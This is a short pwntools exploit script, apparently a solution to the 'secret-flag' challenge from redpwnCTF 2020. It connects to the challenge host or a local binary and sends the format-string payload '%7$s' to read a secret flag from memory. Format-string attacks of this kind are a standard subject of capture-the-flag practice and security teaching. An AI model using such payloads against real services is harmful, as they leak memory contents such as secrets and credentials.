from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./secret-flag"
HOST = "2020.redpwnc.tf"
PORT = 31826 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)

def exploit():
	payload = "%7$s"
	conn.sendlineafter("?\n", payload)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
